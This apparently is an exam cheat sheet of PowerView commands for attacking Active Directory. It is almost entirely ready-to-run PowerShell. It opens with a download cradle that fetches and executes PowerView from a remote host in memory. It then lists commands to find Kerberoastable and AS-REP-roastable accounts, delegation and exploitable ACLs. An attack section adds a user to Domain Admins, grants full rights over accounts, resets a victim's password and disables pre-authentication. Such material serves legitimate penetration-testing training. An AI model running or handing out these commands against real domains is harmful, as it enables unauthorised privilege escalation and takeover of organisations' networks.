# PowerView Essential Commands — Exam Reference

The 20 commands you'll actually use. Load PowerView via IEX if the full module is blocked.

---

## Load PowerView

```powershell
# From web server (recommended — no disk write):
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202/PowerView.ps1')

# From disk (if allowed):
Import-Module .\PowerView.ps1

# CLM bypass first if constrained:
# → Use RUNBOOK at 01-evasion/clm-bypass/
```

---

## Domain / Forest Info

```powershell
Get-Domain                              # basic domain info
Get-DomainSID                           # domain SID (needed for Golden Ticket)
Get-ForestDomain                        # all domains in forest
Get-DomainController                    # find DCs
Get-DomainTrust                         # trust relationships
```

---

## Users & Groups

```powershell
# All users:
Get-DomainUser | Select samaccountname, description

# Find admin users:
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"

# User with SPN (Kerberoastable):
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Users without PreAuth (AS-REP roastable):
Get-DomainUser -PreauthNotRequired | Select samaccountname

# Logged-in users on a machine (requires local admin on target):
Get-NetLoggedon -ComputerName TARGET

# Active sessions on a machine:
Get-NetSession -ComputerName TARGET
```

---

## Computers & Services

```powershell
# All computers:
Get-DomainComputer | Select name, operatingsystem

# Computers with Unconstrained Delegation:
Get-DomainComputer -Unconstrained | Select name

# Find machine running specific service:
Find-DomainUserLocation -UserName administrator   # where is admin logged in?

# Find shares:
Find-DomainShare                        # all shares in domain
Find-DomainShare -CheckShareAccess      # shares accessible by current user
```

---

## ACL Analysis (Critical for finding attack paths)

```powershell
# Find ACEs where you (or your group) have write rights:
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "YourUser"}

# Get all ACLs on a specific object:
Get-DomainObjectAcl -Identity "targetuser" -ResolveGUIDs

# Find GenericWrite/GenericAll on any object:
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl"
} | Where-Object {
    $_.IdentityReferenceName -match "YourUser|YourGroup"
}

# Check specific right on specific object:
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteMembers"}
```

---

## GPO Enumeration

```powershell
# List all GPOs:
Get-DomainGPO | Select displayname, gpcfilesyspath

# Find GPOs applied to a specific OU:
Get-DomainGPO -ComputerName TARGET

# Find GPOs where you have write access:
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|CreateChild"}
```

---

## Local Admin Access (BloodHound Alternative)

```powershell
# Find machines where current user has local admin:
Find-LocalAdminAccess                               # slow but comprehensive
Find-LocalAdminAccess -ComputerName TARGET          # specific target

# Test specific machine:
Test-AdminAccess -ComputerName TARGET
```

---

## Modify AD Objects (Attack Phase)

```powershell
# Add user to group:
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"

# Modify an object's ACL (grant yourself GenericAll):
Add-DomainObjectAcl -TargetIdentity "targetuser" -PrincipalIdentity "youruser" -Rights All

# Change a user's password (requires write access):
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Disable pre-auth (for AS-REP roasting):
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# Set SPN on an account (for Kerberoasting a new target):
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname="fake/spn"}
```

---

## Quick Triage One-Liners

```powershell
# DA members:
Get-DomainGroupMember "Domain Admins" | Select MemberName

# Kerberoastable accounts:
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname | ft -AutoSize

# AS-REP roastable:
Get-DomainUser -PreauthNotRequired | Select samaccountname

# Unconstrained delegation computers:
Get-DomainComputer -Unconstrained | Select name

# Where is Domain Admin logged in right now?
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# My current rights over targetuser:
Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match $env:USERNAME}
```
